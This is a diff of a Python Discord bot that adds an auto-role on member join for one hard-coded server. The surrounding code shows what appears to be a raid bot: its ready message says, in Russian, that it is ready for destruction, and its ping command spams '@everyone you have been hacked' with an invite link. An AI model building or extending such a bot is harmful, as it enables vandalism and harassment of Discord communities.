@@ -39,6 +39,13 @@ bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 async def on_ready():
     print(f"Бот {bot.user} готов к уничтожению")
 
+@bot.event
+async def on_member_join(member):
+    if member.guild.id == 1520817743127904477:
+        role = member.guild.get_role(1520843245234553085)
+        if role:
+            await member.add_roles(role)
+
 @bot.command()
 async def ping(ctx):
     await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
